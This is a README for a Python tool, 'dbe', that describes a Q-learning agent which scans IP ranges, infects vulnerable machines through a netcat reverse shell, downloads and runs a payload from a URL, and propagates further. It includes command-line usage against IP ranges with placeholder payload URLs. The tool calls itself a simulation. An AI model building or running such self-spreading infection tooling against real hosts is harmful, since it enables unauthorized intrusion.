# dbe

**Don't be evil.**

## Overview

The script is designed to simulate a cybersecurity scenario in which an agent learns to perform various actions in order to infect machines, perform self-healing, and propagate to other machines. The agent uses a Q-learning algorithm enhanced with curriculum learning, memory augmentation, and neuro-symbolic reasoning to improve its decision-making capabilities.

In simpler terms, the script is like a game where the agent learns to take actions to achieve a goal (in this case, infecting machines and spreading the infection). The agent uses a special kind of learning algorithm called Q-learning to figure out which actions are the best to take in each situation.

## How It Works

The script takes a list of IP addresses as input and scans them to see if they are vulnerable to a specific exploit. If a vulnerable machine is found, the agent tries to infect it by connecting to a remote server and executing a payload. The agent performs periodic self-healing actions to ensure smooth operation and propagates to other machines to spread the infection.

The Q-learning algorithm uses a Q-table to keep track of the expected rewards for each action in each state and updates the Q-table based on the rewards received for each action taken. The agent balances exploration and exploitation of the environment using a decaying exploration probability.

## Requirements

- **Python 3.6+**
- **Libraries:** See `requirements.txt` for full list

### Installation

```sh
pip install -r requirements.txt
```

## Usage

The script can be run from the command line with various options to customize its behavior:

```sh
python main.py <ip_range> --payload-url <payload_url> [options]
```

### Required Arguments

- **ip_range:** One or more IP addresses to scan (space-separated)
- **--payload-url:** The URL of the payload to download and execute

### Optional Arguments

- **--remote-server:** The remote server to connect to (default: example.com)
- **--port:** The port to connect to on the remote server (default: 8080)
- **--load-model:** Load Q-table from previous training session
- **--no-save:** Do not save Q-table after training

### Examples

Start fresh training:
```sh
python main.py 192.168.1.1 192.168.1.2 --payload-url https://example.com/payload.sh
```

Resume from saved model:
```sh
python main.py 192.168.1.0/24 --payload-url https://example.com/payload.sh --load-model
```

## Configuration

Edit `config.yaml` to customize hyperparameters:

- **Learning parameters:** max_episodes, learning_rate, discount_factor, exploration_decay
- **Rewards:** success/failure rewards
- **Memory:** long-term memory capacity
- **Network:** remote server, port, connection settings
- **Logging:** log level, output file

### Learning Techniques

1. **Curriculum Learning:** The agent sorts IP addresses by complexity (last octet) to progress from simpler to more complex targets, allowing for gradual learning and adaptation.

2. **Memory Augmentation:** The agent maintains an indexed long-term memory (capacity: 1000) of past experiences, which it uses to make more informed decisions. Best actions are retrieved in O(1) time.

3. **Neuro-Symbolic Integration:** Symbolic reasoning rules guide action selection based on state progression:
   - States 0-10: Focus on infection
   - States 10-50: Focus on propagation
   - States 50+: Focus on self-healing

4. **Continuous Learning:** The agent continuously updates its Q-table throughout training with:
   - Decaying exploration probability (starts at 1.0, decays by 0.995 per episode)
   - Q-learning updates using SARSA (State-Action-Reward-State-Action)
   - Periodic model checkpoints every 100 episodes

5. **Model Persistence:** Q-tables are saved in JSON format for:
   - Resume training from checkpoints
   - Transfer learning to new scenarios
   - Analysis and visualization

### Actions

The agent can perform 5 actions:
- **try_infect (0):** Attempt to compromise target via netcat reverse shell
- **perform_self_healing (1):** Restore from backup and restart
- **propagate (2):** Scan network and infect vulnerable machines
- **check_self_awareness (3):** Monitor memory usage (max: 100MB)
- **explore_environment (4):** Gather hostname and IP information

### State Representation

States are defined by:
- **IP address:** Target machine identifier
- **State number:** Progression counter (0-10000)

State transitions depend on action taken:
- Infect: +1
- Heal: -1 (min 0)
- Propagate: ×2
- Self-aware: ÷2
- Explore: +5

## Features

✅ **Implemented:**
- Q-learning with SARSA updates
- Curriculum learning (IP sorting)
- Long-term memory with O(1) retrieval
- Neuro-symbolic reasoning rules
- Model persistence (save/load Q-tables)
- Configuration management (config.yaml)
- Comprehensive logging
- Input validation (IP addresses, URLs)
- Unit tests (pytest)
- Error handling and recovery

🔄 **Partial Implementation:**
- Payload download (functional but not integrated with actual exploitation)

❌ **Not Implemented:**
- Multi-task learning (single task only)
- Deep neural network function approximation
- Advanced vulnerability scanning beyond port checks
- Real exploitation (simulation only)

## Development

### Running Tests

```sh
pytest tests/ -v
```

### Code Structure

- `main.py` - Main agent implementation
- `config.yaml` - Hyperparameter configuration
- `requirements.txt` - Python dependencies
- `tests/` - Unit test suite
- `IMPROVEMENTS.md` - Detailed changelog

### Logging

All operations are logged to `dbe.log` with timestamps and severity levels. Set log level in `config.yaml`.

# Disclaimer

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

The use of our Software and any associated materials (including but not limited to code, libraries, scripts, and examples) is at your own risk. By using our Software, you understand and agree that you are solely responsible for your actions and the consequences thereof. We expressly disclaim any liability or responsibility for any harm resulting from your use of our Software, and by using our Software, you agree to this disclaimer and our terms of use.

Our Software is intended to be used for legal purposes only. It is your responsibility to stay compliant with all the local, state, and federal laws and regulations applicable to you when using our Software. You agree not to use our Software in an illegal manner or to infringe on the rights of others. You agree that you will not use our Software to commit a crime, or to enable others to commit a crime.

We are not responsible for any harm or damage caused by your use of our Software. You agree to indemnify and hold harmless the authors, maintainers, and contributors of the Software for any and all claims arising from your use of our Software, your violation of this disclaimer, or your violation of any rights of a third party.

If you do not agree with this disclaimer, please do not use our Software. Your use of our Software signifies your agreement with this disclaimer.

This disclaimer is subject to change without notice, and it is your responsibility to review this disclaimer periodically to ensure you are aware of its terms.
